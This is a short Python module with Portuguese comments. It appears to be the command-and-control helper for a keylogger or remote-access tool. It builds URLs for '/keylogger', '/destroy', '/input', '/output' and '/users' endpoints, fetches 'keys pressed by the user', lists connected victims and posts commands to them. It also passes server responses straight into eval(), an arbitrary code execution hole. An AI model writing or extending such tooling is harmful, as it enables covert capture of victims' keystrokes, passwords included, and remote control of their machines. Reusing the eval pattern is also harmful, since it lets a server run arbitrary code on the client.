import requests


def get_content(url, wait = True):

    """
    Obtém o conteúdo de uma URL.
    :param wait: Aguarda até que haja algum conteúdo.
    """
    
    content = ""
    url = url.replace(" ", "%20")

    while not content:

        try:
            response = requests.get(url)
            content = response.content.decode() if response.status_code == 200 else ""
        except: 
            pass

        if not wait: break

    return content


def get_keys(url, wait = False):

    """
    Retorna as teclas pressionadas pelo usuário.
    """

    content = get_content(url, wait = wait)
    return [key for key in content.split()]


def get_users(url):

    """
    Retorna uma lista com todos os usuários do servidor.
    """

    try: return [user for user in eval(get_content(url, wait = False).replace("%20", " "))]
    except: return [""]


def format_url(destroy_url = None, input_url = None, keylogger_url = None, menu_url = None, output_url = None):

    """
    Retorna URL formatada.
    """

    if destroy_url: return destroy_url + "/destroy"
    elif input_url: return input_url + "/input"
    elif keylogger_url: return keylogger_url + "/keylogger"
    elif menu_url: return menu_url + "/users"
    elif output_url: return output_url + "/output"


def send(url = "", text = ""):

    """
    Envia um texto.
    """

    url = url.replace(" ", "%20")
    
    try: requests.post(url, json = {"text": text})
    except: return -1

    
